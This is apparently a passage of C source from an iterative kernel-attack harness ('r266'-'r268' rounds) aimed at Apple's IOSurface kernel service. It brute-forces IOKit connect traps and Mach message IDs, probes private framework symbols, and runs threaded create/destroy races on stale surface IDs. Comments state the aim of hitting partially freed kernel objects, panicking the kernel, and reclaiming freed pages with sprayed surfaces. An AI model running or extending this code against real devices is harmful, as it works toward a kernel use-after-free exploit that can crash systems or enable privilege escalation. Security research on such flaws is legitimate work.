    kr = t4(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0, 0); rlog("    T4(6, sp, np,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid, 0); rlog("    T4(6, sp, np,sID,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 6, (uintptr_t)sp, sid, (uintptr_t)np, 0); rlog("    T4(6, sp, sID,np,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 6, (uintptr_t)sp, 1, (uintptr_t)np, 0); rlog("    T4(6, sp, 1,np,0): 0x%x\n", kr); fflush(stdout);

    /* T5: port + four more */
    kr = t5(conn, 6, (uintptr_t)sp, 0, 0, 0, 0); rlog("    T5(6, sp, 0,0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t5(conn, 6, (uintptr_t)sp, sid, 0, 0, 0); rlog("    T5(6, sp, sID,0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t5(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid, 0, 0); rlog("    T5(6, sp, np,sID,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t5(conn, 6, (uintptr_t)sp, sid, (uintptr_t)np, 0, 0); rlog("    T5(6, sp, sID,np,0,0): 0x%x\n", kr); fflush(stdout);

    /* T6: port + five more */
    kr = t6(conn, 6, (uintptr_t)sp, 0, 0, 0, 0, 0); rlog("    T6(6, sp, 0,0,0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t6(conn, 6, (uintptr_t)sp, sid, 0, 0, 0, 0); rlog("    T6(6, sp, sID,0,0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t6(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0, 0, 0, 0); rlog("    T6(6, sp, np,0,0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t6(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid, 0, 0, 0); rlog("    T6(6, sp, np,sID,0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t6(conn, 6, (uintptr_t)sp, sid, (uintptr_t)np, 0, 0, 0); rlog("    T6(6, sp, sID,np,0,0,0): 0x%x\n", kr); fflush(stdout);

    /* Try with notification type values 0-3 as second arg */
    rlog("\n  --- Trap 6: sp + notify_type sweep ---\n"); fflush(stdout);
    for (int nt = 0; nt <= 7; nt++) {
        kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)nt);
        rlog("    T2(6, sp, %d): 0x%x\n", nt, kr); fflush(stdout);
    }

    /* Try with memory address as arg (surface base address) */
    IOSurfaceLock(surf, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(surf);
    IOSurfaceUnlock(surf, 0, NULL);
    if (base) {
        rlog("\n  --- Trap 6: sp + base address ---\n"); fflush(stdout);
        kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)base);
        rlog("    T2(6, sp, base): 0x%x\n", kr); fflush(stdout);
        kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)base, 4096);
        rlog("    T3(6, sp, base, 4096): 0x%x\n", kr); fflush(stdout);
    }

    /* ========== Trap idx=7 with surfMachPort as FIRST arg ========== */
    rlog("\n  --- Trap 7: surfMachPort as first arg ---\n"); fflush(stdout);

    kr = t1(conn, 7, (uintptr_t)sp);
    rlog("    T1(7, sp): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 7, (uintptr_t)sp, 0); rlog("    T2(7, sp, 0): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 7, (uintptr_t)sp, 1); rlog("    T2(7, sp, 1): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 7, (uintptr_t)sp, sid); rlog("    T2(7, sp, sID): 0x%x\n", kr); fflush(stdout);
    kr = t2(conn, 7, (uintptr_t)sp, (uintptr_t)np); rlog("    T2(7, sp, np): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 7, (uintptr_t)sp, 0, 0); rlog("    T3(7, sp, 0,0): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 7, (uintptr_t)sp, sid, 0); rlog("    T3(7, sp, sID,0): 0x%x\n", kr); fflush(stdout);
    kr = t3(conn, 7, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T3(7, sp, np,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 7, (uintptr_t)sp, 0, 0, 0); rlog("    T4(7, sp, 0,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 7, (uintptr_t)sp, sid, 0, 0); rlog("    T4(7, sp, sID,0,0): 0x%x\n", kr); fflush(stdout);
    kr = t4(conn, 7, (uintptr_t)sp, (uintptr_t)np, sid, 0); rlog("    T4(7, sp, np,sID,0): 0x%x\n", kr); fflush(stdout);

    /* ========== Try different trap indices with surfMachPort ========== */
    rlog("\n  --- Other trap indices with sp ---\n"); fflush(stdout);
    for (int idx = 0; idx <= 10; idx++) {
        if (idx == 6 || idx == 7) continue;
        kr = t1(conn, idx, (uintptr_t)sp);
        rlog("    T1(%d, sp): 0x%x\n", idx, kr); fflush(stdout);
    }

    /* ========== Part 2: Safe mach_msg probe with fflush ========== */
    rlog("\n=== r268 Part 2: Safe mach_msg to IOSurface port ===\n"); fflush(stdout);
    {
        /* Only send, no receive - avoid blocking */
        struct {
            mach_msg_header_t hdr;
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        msg.hdr.msgh_size = sizeof(msg);
        msg.hdr.msgh_remote_port = sp;
        msg.hdr.msgh_local_port = MACH_PORT_NULL;
        msg.hdr.msgh_id = 0;

        rlog("  Sending minimal msg (no reply) to port %u...\n", sp); fflush(stdout);
        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
            MACH_PORT_NULL, 50, MACH_PORT_NULL);
        rlog("  mach_msg(id=0, no_reply): kr=0x%x\n", kr); fflush(stdout);

        /* Try a few more IDs if the first worked */
        for (int mid = 1; mid <= 5; mid++) {
            msg.hdr.msgh_id = mid;
            msg.hdr.msgh_remote_port = sp;
            msg.hdr.msgh_local_port = MACH_PORT_NULL;
            msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
            msg.hdr.msgh_size = sizeof(msg);
            kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
                MACH_PORT_NULL, 50, MACH_PORT_NULL);
            rlog("  mach_msg(id=%d, no_reply): kr=0x%x\n", mid, kr); fflush(stdout);
        }
    }

    /* Part 3: Private symbol probe */
    rlog("\n=== r268 Part 3: Private IOSurface symbols ===\n"); fflush(stdout);
    {
        void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (iosfc) {
            const char *syms[] = {
                "IOSurfaceCopyAllValues", "IOSurfaceRemoveAllValues",
                "IOSurfaceClientCreate", "IOSurfaceClientRelease",
                "IOSurfaceClientLookup", "IOSurfaceClientLock",
                "IOSurfaceSendRight", "IOSurfacePortForID",
                "_IOSurfaceNotifyValues", "_IOSurfaceSetNotify",
                "_IOSurfaceRemoveNotify", "_IOSurfaceSendMessage",
                "_IOSurfaceGetMachPort", "_IOSurfaceXPCSetValue",
                "IOSurfacePropertyModify", "IOSurfacePropertyListModify",
                NULL
            };
            for (int i = 0; syms[i]; i++) {
                void *p = dlsym(iosfc, syms[i]);
                if (p) rlog("  FOUND: %s = %p\n", syms[i], p);
            }
            fflush(stdout);
            dlclose(iosfc);
        }
        /* Also check IOKit for Trap3-5 */
        void *iokitfw = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        if (iokitfw) {
            const char *iokit_syms[] = {
                "IOConnectTrap3", "IOConnectTrap4", "IOConnectTrap5",
                "IOConnectAddClient", "io_connect_method",
                NULL
            };
            for (int i = 0; iokit_syms[i]; i++) {
                void *p = dlsym(iokitfw, iokit_syms[i]);
                if (p) rlog("  IOKit: %s = %p\n", iokit_syms[i], p);
            }
            fflush(stdout);
            dlclose(iokitfw);
        }
    }

    if (iokit) dlclose(iokit);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    mach_port_deallocate(mach_task_self(), sp);
    mach_port_deallocate(mach_task_self(), np);
    __sync_fetch_and_add(&r268_probed, 1);
    fflush(stdout);
}

/* r267: Direct Mach messaging to IOSurface port + port enumeration + targeted race.
 * r266 showed trap 6/7 return differently when given the IOSurface Mach port
 * (BadArgument instead of IPCError). The framework must use Mach IPC to bypass
 * disabled IOConnectCallMethod. This round:
 * Part 1: Probe IOSurface Mach port with raw mach_msg (various message IDs)
 * Part 2: Enumerate Mach ports before/after IOSurfaceSetValue to find IPC port
 * Part 3: dlsym probe for private IOSurface framework symbols
 * Part 4: Targeted race with kernel-touching ops (Lock/Purgeable) on stale surfaces */
static volatile int r267_probed = 0;
static volatile int r267_race_stop = 0;
static volatile uint64_t r267_lock_ok = 0, r267_lock_fail = 0;
static volatile uint64_t r267_purg_ok = 0, r267_purg_fail = 0;
static volatile uint64_t r267_tex_ok = 0, r267_tex_fail = 0;

/* r267 destroyer: rapidly create/destroy surfaces */
static void *r267_destroyer_fn(void *arg) {
    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
    uint64_t created = 0;
    while (!r267_race_stop) {
        IOSurfaceRef s = IOSurfaceCreate(props);
        if (!s) continue;
        created++;
        IOSurfaceSetValue(s, CFSTR("r267k"), CFSTR("v"));
        CFRelease(s);
    }
    rlog("    r267 destroyer: %llu created\n", created);
    return NULL;
}

/* r267 ID tracker */
static volatile uint32_t r267_last_ids[64];
static volatile int r267_id_head = 0;

static void *r267_id_tracker_fn(void *arg) {
    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
    while (!r267_race_stop) {
        IOSurfaceRef s = IOSurfaceCreate(props);
        if (!s) continue;
        uint32_t sid = IOSurfaceGetID(s);
        int idx = __sync_fetch_and_add(&r267_id_head, 1) & 63;
        r267_last_ids[idx] = sid;
        IOSurfaceSetValue(s, CFSTR("r267k"), CFSTR("v"));
        CFRelease(s);
    }
    return NULL;
}

/* r267 kernel-touching racer: perform kernel ops on looked-up surfaces */
static void *r267_kernel_racer_fn(void *arg) {
    int mode = (int)(uintptr_t)arg; /* 0=lock, 1=purgeable, 2=usecount+setvalue */
    uint64_t ops = 0, fails = 0;

    while (!r267_race_stop) {
        int idx = (r267_id_head - 1) & 63;
        uint32_t sid = r267_last_ids[idx];
        if (!sid) continue;

        IOSurfaceRef s = IOSurfaceLookup(sid);
        if (!s) { fails++; continue; }

        if (mode == 0) {
            /* Lock the surface — kernel operation */
            kern_return_t kr = IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
            if (kr == 0) {
                ops++;
                void *base = IOSurfaceGetBaseAddress(s);
                if (base) {
                    volatile uint8_t v = ((volatile uint8_t*)base)[0];
                    (void)v;
                }
                IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
            } else {
                fails++;
            }
        } else if (mode == 1) {
            /* Purgeable state toggle — kernel VM operation */
            uint32_t old = 0;
            kern_return_t kr = IOSurfaceSetPurgeable(s, 1, &old);
            if (kr == 0) {
                ops++;
                IOSurfaceSetPurgeable(s, 0, &old);
            } else {
                fails++;
            }
        } else if (mode == 2) {
            /* UseCount + SetValue — kernel property + refcount ops */
            IOSurfaceIncrementUseCount(s);
            IOSurfaceSetValue(s, CFSTR("r267race"), CFSTR("v"));
            CFTypeRef v = IOSurfaceCopyValue(s, CFSTR("r267race"));
            if (v) { ops++; CFRelease(v); } else { fails++; }
            IOSurfaceRemoveValue(s, CFSTR("r267race"));
            IOSurfaceDecrementUseCount(s);
        }
        CFRelease(s);
    }

    if (mode == 0) { __sync_fetch_and_add(&r267_lock_ok, ops); __sync_fetch_and_add(&r267_lock_fail, fails); }
    else if (mode == 1) { __sync_fetch_and_add(&r267_purg_ok, ops); __sync_fetch_and_add(&r267_purg_fail, fails); }
    else { __sync_fetch_and_add(&r267_tex_ok, ops); __sync_fetch_and_add(&r267_tex_fail, fails); }

    rlog("    r267 kernel_racer mode=%d: ops=%llu fails=%llu\n", mode, ops, fails);
    return NULL;
}

static void r267_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    /* Part 1: Direct Mach messaging to IOSurface port */
    rlog("\n=== r267 Part 1: Mach message probe to IOSurface port ===\n");
    mach_port_t sp = IOSurfaceCreateMachPort(surf);
    rlog("  IOSurface Mach port: %u (surfID=%u)\n", sp, sid);

    /* Check port type */
    mach_port_type_t ptype = 0;
    kr = mach_port_type(mach_task_self(), sp, &ptype);
    rlog("  mach_port_type: kr=0x%x type=0x%x", kr, ptype);
    if (ptype & MACH_PORT_TYPE_SEND) rlog(" SEND");
    if (ptype & MACH_PORT_TYPE_RECEIVE) rlog(" RECEIVE");
    if (ptype & MACH_PORT_TYPE_SEND_ONCE) rlog(" SEND_ONCE");
    if (ptype & MACH_PORT_TYPE_DEAD_NAME) rlog(" DEAD");
    rlog("\n");

    /* Create reply port */
    mach_port_t rp = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rp);

    /* Try sending messages with various IDs */
    rlog("  Sending mach_msg with various IDs:\n");
    for (int mid = 0; mid <= 20; mid++) {
        struct {
            mach_msg_header_t hdr;
            uint32_t data[4];
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
        msg.hdr.msgh_size = sizeof(msg);
        msg.hdr.msgh_remote_port = sp;
        msg.hdr.msgh_local_port = rp;
        msg.hdr.msgh_id = mid;
        msg.data[0] = sid;

        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
            MACH_PORT_NULL, 100, MACH_PORT_NULL);
        rlog("    msg_id=%d send: kr=0x%x\n", mid, kr);

        if (kr == KERN_SUCCESS) {
            /* Try to receive a reply */
            struct {
                mach_msg_header_t hdr;
                uint8_t body[256];
            } reply;
            memset(&reply, 0, sizeof(reply));
            kr = mach_msg(&reply.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                sizeof(reply), rp, 100, MACH_PORT_NULL);
            rlog("    msg_id=%d recv: kr=0x%x", mid, kr);
            if (kr == KERN_SUCCESS) {
                rlog(" reply_id=%d size=%u", reply.hdr.msgh_id, reply.hdr.msgh_size);
                uint32_t *rdata = (uint32_t*)reply.body;
                for (int i = 0; i < 4 && i * 4 < (int)(reply.hdr.msgh_size - sizeof(mach_msg_header_t)); i++)
                    rlog(" [%d]=0x%x", i, rdata[i]);
            }
            rlog("\n");
        }
    }

    /* Try MIG-style message IDs (typically 2800-2900 range for IOKit) */
    rlog("  MIG-style message IDs:\n");
    int mig_ids[] = {2800, 2801, 2802, 2803, 2804, 2805, 2810, 2815, 2817, 2818,
                     2820, 2850, 2860, 2861, 2862, 2863, 2864, 2865, 2900,
                     3000, 3400, 3401, 3800, 3801, 4000, 4800, 4801};
    for (int i = 0; i < (int)(sizeof(mig_ids)/sizeof(mig_ids[0])); i++) {
        struct {
            mach_msg_header_t hdr;
            uint32_t data[8];
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
        msg.hdr.msgh_size = sizeof(msg);
        msg.hdr.msgh_remote_port = sp;
        msg.hdr.msgh_local_port = rp;
        msg.hdr.msgh_id = mig_ids[i];
        msg.data[0] = sid;

        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
            MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            rlog("    mid=%d: send=0x%x\n", mig_ids[i], kr);
            continue;
        }
        struct {
            mach_msg_header_t hdr;
            uint8_t body[512];
        } reply;
        memset(&reply, 0, sizeof(reply));
        kr = mach_msg(&reply.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
            sizeof(reply), rp, 200, MACH_PORT_NULL);
        rlog("    mid=%d: send=OK recv=0x%x", mig_ids[i], kr);
        if (kr == KERN_SUCCESS) {
            rlog(" reply_id=%d size=%u", reply.hdr.msgh_id, reply.hdr.msgh_size);
            uint32_t *rd = (uint32_t*)reply.body;
            int words = (reply.hdr.msgh_size - sizeof(mach_msg_header_t)) / 4;
            if (words > 8) words = 8;
            for (int j = 0; j < words; j++)
                rlog(" [%d]=0x%x", j, rd[j]);
        }
        rlog("\n");
    }

    mach_port_deallocate(mach_task_self(), rp);

    /* Also try sending to the IOSurfaceRoot CONNECTION port (not the surface port) */
    rlog("\n  --- Testing IOSurfaceRoot connection port ---\n");
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (conn) {
        /* Get the Mach port underlying the IOKit connection */
        mach_port_t conn_port = conn; /* io_connect_t IS a mach_port_t */
        ptype = 0;
        kr = mach_port_type(mach_task_self(), conn_port, &ptype);
        rlog("  conn port=%u type=0x%x", conn_port, ptype);
        if (ptype & MACH_PORT_TYPE_SEND) rlog(" SEND");
        rlog("\n");

        IOServiceClose(conn);
    }
    IOObjectRelease(svc);

    /* Part 2: Port enumeration to find framework IPC port */
    rlog("\n=== r267 Part 2: Mach port enumeration ===\n");
    {
        mach_port_name_array_t names1 = NULL;
        mach_msg_type_number_t count1 = 0;
        mach_port_type_array_t types1 = NULL;
        mach_msg_type_number_t tcount1 = 0;
        kr = mach_port_names(mach_task_self(), &names1, &count1, &types1, &tcount1);
        rlog("  Ports before IOSurfaceSetValue: count=%u\n", count1);

        /* Call IOSurfaceSetValue — this communicates with kernel */
        IOSurfaceSetValue(surf, CFSTR("r267_probe"), CFSTR("test"));

        mach_port_name_array_t names2 = NULL;
        mach_msg_type_number_t count2 = 0;
        mach_port_type_array_t types2 = NULL;
        mach_msg_type_number_t tcount2 = 0;
        kr = mach_port_names(mach_task_self(), &names2, &count2, &types2, &tcount2);
        rlog("  Ports after IOSurfaceSetValue: count=%u\n", count2);

        /* Show send-right ports (likely IPC channels) */
        rlog("  Send-right ports (potential IPC):\n");
        int shown = 0;
        for (uint32_t i = 0; i < count2 && shown < 30; i++) {
            if (types2[i] & MACH_PORT_TYPE_SEND) {
                rlog("    port=%u type=0x%x\n", names2[i], types2[i]);
                shown++;
            }
        }

        if (names1) vm_deallocate(mach_task_self(), (vm_address_t)names1, count1 * sizeof(mach_port_name_t));
        if (types1) vm_deallocate(mach_task_self(), (vm_address_t)types1, count1 * sizeof(mach_port_type_t));
        if (names2) vm_deallocate(mach_task_self(), (vm_address_t)names2, count2 * sizeof(mach_port_name_t));
        if (types2) vm_deallocate(mach_task_self(), (vm_address_t)types2, count2 * sizeof(mach_port_type_t));

        IOSurfaceRemoveValue(surf, CFSTR("r267_probe"));
    }

    /* Part 3: Private IOSurface framework symbol probe */
    rlog("\n=== r267 Part 3: Private IOSurface symbols ===\n");
    void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (iosfc) {
        const char *syms[] = {
            "_IOSurfaceGetConnection", "_IOSurfaceRootConnection",
            "IOSurfaceRootUserClient", "_IOSurfaceSetNotify",
            "_IOSurfaceRemoveNotify", "_IOSurfaceNotifyValues",
            "IOSurfacePropertyListModify", "IOSurfacePropertyModify",
            "_IOSurfaceClientSetValue", "_IOSurfaceClientCopyValue",
            "IOSurfaceClientCreate", "IOSurfaceClientRelease",
            "IOSurfaceClientLookup", "IOSurfaceClientLock",
            "IOSurfaceClientUnlock", "IOSurfaceClientSetPurgeable",
            "_IOSurfaceXPCSetValue", "_IOSurfaceXPCCopyValue",
            "IOSurfaceSendRight", "IOSurfacePortForID",
            "_IOSurfaceMachPortSend", "_IOSurfaceMachPortCallout",
            "IOSurfaceCopyAllValues", "IOSurfaceRemoveAllValues",
            "_IOSurfaceGetMachPort", "_IOSurfaceSendMessage",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            void *p = dlsym(iosfc, syms[i]);
            if (p) rlog("  FOUND: %s = %p\n", syms[i], p);
        }

        /* Also try common IOKit internal symbols */
        void *iokitfw = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        if (iokitfw) {
            const char *iokit_syms[] = {
                "IOConnectTrap3", "IOConnectTrap4", "IOConnectTrap5",
                "IOConnectCallAsyncStructMethod", "IOConnectCallAsyncScalarMethod",
                "io_connect_method", "io_connect_async_method",
                "_IOServiceRequestProbe", "IOConnectAddClient",
                NULL
            };
            for (int i = 0; iokit_syms[i]; i++) {
                void *p = dlsym(iokitfw, iokit_syms[i]);
                if (p) rlog("  IOKit FOUND: %s = %p\n", iokit_syms[i], p);
            }
            dlclose(iokitfw);
        }
        dlclose(iosfc);
    } else {
        rlog("  Cannot open IOSurface framework\n");
    }

    /* Part 4: Targeted kernel race (8 seconds) */
    rlog("\n=== r267 Part 4: Kernel-touching race (8s) ===\n");
    rlog("  Racing create/destroy + Lock/Purgeable/MetalTex on stale lookups\n");

    int w = 32, h = 32, bpe = 4, bpr = w * bpe, pf = 0x42475241, as = bpr * h;
    CFMutableDictionaryRef rprops = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef rw = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef rh = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef rb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef rr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFNumberRef ras = CFNumberCreate(NULL, kCFNumberIntType, &as);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceWidth"), rw);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceHeight"), rh);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerElement"), rb);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerRow"), rr);
    CFDictionarySetValue(rprops, CFSTR("IOSurfacePixelFormat"), rpf);
    CFDictionarySetValue(rprops, CFSTR("IOSurfaceAllocSize"), ras);
    CFRelease(rw); CFRelease(rh); CFRelease(rb); CFRelease(rr); CFRelease(rpf); CFRelease(ras);

    memset((void*)r267_last_ids, 0, sizeof(r267_last_ids));
    r267_race_stop = 0;
    r267_id_head = 0;
    r267_lock_ok = r267_lock_fail = r267_purg_ok = r267_purg_fail = 0;
    r267_tex_ok = r267_tex_fail = 0;

    pthread_t threads[12];
    int tc = 0;
    pthread_create(&threads[tc++], NULL, r267_destroyer_fn, rprops);
    pthread_create(&threads[tc++], NULL, r267_destroyer_fn, rprops);
    pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
    pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
    /* Kernel-touching racers: mode 0=lock, 1=purgeable, 2=metal */
    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)2);
    pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)2);

    sleep(8);
    r267_race_stop = 1;
    for (int i = 0; i < tc; i++) pthread_join(threads[i], NULL);

    rlog("  Lock: ok=%llu fail=%llu\n", r267_lock_ok, r267_lock_fail);
    rlog("  Purgeable: ok=%llu fail=%llu\n", r267_purg_ok, r267_purg_fail);
    rlog("  MetalTex: ok=%llu fail=%llu\n", r267_tex_ok, r267_tex_fail);

    CFRelease(rprops);
    mach_port_deallocate(mach_task_self(), sp);
    __sync_fetch_and_add(&r267_probed, 1);
    fflush(stdout);
}

/* r266: Deep trap 6/7 probe (IPCError path), AGX type=1 selectors,
 * and multi-threaded framework API race.
 * Trap 6/7 returned kIOReturnIPCError (0xe00002bf) in r265 — different from
 * BadArgument. They reach live IOSurface kernel code. The IPC error likely means
 * we need a notification port set up first. Also probe AGX restricted client
 * for selectors that interact with IOSurfaces. */
static volatile int r266_probed = 0;
static volatile int r266_race_stop = 0;
static volatile uint64_t r266_set_ok = 0, r266_set_fail = 0;
static volatile uint64_t r266_lookup_ok = 0, r266_lookup_fail = 0;
static volatile uint64_t r266_stale_hit = 0;

/* r266 destroyer: rapidly create/destroy surfaces */
static void *r266_destroyer_fn(void *arg) {
    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
    uint64_t created = 0;
    while (!r266_race_stop) {
        IOSurfaceRef s = IOSurfaceCreate(props);
        if (!s) continue;
        created++;
        IOSurfaceSetValue(s, CFSTR("r266k"), CFSTR("r266v"));
        CFRelease(s);
    }
    rlog("    destroyer: created=%llu\n", created);
    return NULL;
}

/* r266 lookup racer: try IOSurfaceLookup on recently-seen IDs */
static volatile uint32_t r266_last_ids[64];
static volatile int r266_id_head = 0;

static void *r266_id_tracker_fn(void *arg) {
    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
    while (!r266_race_stop) {
        IOSurfaceRef s = IOSurfaceCreate(props);
        if (!s) continue;
        uint32_t sid = IOSurfaceGetID(s);
        int idx = __sync_fetch_and_add(&r266_id_head, 1) & 63;
        r266_last_ids[idx] = sid;
        IOSurfaceSetValue(s, CFSTR("track"), CFSTR("v"));
        CFRelease(s);
    }
    return NULL;
}

static void *r266_lookup_racer_fn(void *arg) {
    (void)arg;
    uint64_t lookups = 0, found = 0, stale = 0;
    while (!r266_race_stop) {
        int idx = (r266_id_head - 1) & 63;
        uint32_t sid = r266_last_ids[idx];
        if (!sid) continue;
        lookups++;
        IOSurfaceRef s = IOSurfaceLookup(sid);
        if (s) {
            found++;
            /* Try to access properties — if the kernel object is partially freed,
             * this may trigger a kernel panic */
            CFTypeRef v = IOSurfaceCopyValue(s, CFSTR("track"));
            if (!v) {
                stale++;
                __sync_fetch_and_add(&r266_stale_hit, 1);
            } else {
                CFRelease(v);
            }
            IOSurfaceSetValue(s, CFSTR("race"), CFSTR("hit"));
            CFRelease(s);
        }
    }
    __sync_fetch_and_add(&r266_lookup_ok, found);
    __sync_fetch_and_add(&r266_lookup_fail, lookups - found);
    rlog("    lookup_racer: lookups=%llu found=%llu stale=%llu\n",
        lookups, found, stale);
    return NULL;
}

/* r266 purgeable racer: toggle purgeable state during destruction */
static void *r266_purgeable_racer_fn(void *arg) {
    CFMutableDictionaryRef props = (CFMutableDictionaryRef)arg;
    uint64_t cycles = 0;
    while (!r266_race_stop) {
        IOSurfaceRef s = IOSurfaceCreate(props);
        if (!s) continue;
        cycles++;
        uint32_t old = 0;
        IOSurfaceSetPurgeable(s, 1, &old); /* Volatile */
        /* Don't set back to NonVolatile — let the VM reclaim pages
         * while we try to access the backing memory */
        IOSurfaceLock(s, 0, NULL);
        void *base = IOSurfaceGetBaseAddress(s);
        /* Write a pattern to backing memory */
        if (base) memset(base, 0xAA, 64);
        IOSurfaceUnlock(s, 0, NULL);
        CFRelease(s);
        /* After release, the backing pages may linger momentarily.
         * Another thread spraying surfaces may reclaim them. */
    }
    rlog("    purgeable_racer: cycles=%llu\n", cycles);
    return NULL;
}

static void r266_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r266 Part 1: Deep trap 6/7 probe with notification ports ===\n");

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (!conn) { rlog("  FAIL: cannot open IOSurfaceRoot\n"); IOObjectRelease(svc); return; }

    /* Create notification ports */
    mach_port_t np = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &np);
    mach_port_insert_right(mach_task_self(), np, np, MACH_MSG_TYPE_MAKE_SEND);

    /* Register notification port on the IOSurfaceRoot connection */
    for (int t = 0; t < 4; t++) {
        kr = IOConnectSetNotificationPort(conn, t, np, 0);
        rlog("  SetNotificationPort(type=%d): kr=0x%x\n", t, kr);
    }

    /* Load all trap functions via dlsym */
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    typedef kern_return_t (*trap0_t)(io_connect_t, uint32_t);
    typedef kern_return_t (*trap1_t)(io_connect_t, uint32_t, uintptr_t);
    typedef kern_return_t (*trap2_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap3_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap4_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap5_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    typedef kern_return_t (*trap6_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t,
        uintptr_t, uintptr_t, uintptr_t, uintptr_t);

    trap0_t t0 = (trap0_t)dlsym(iokit, "IOConnectTrap0");
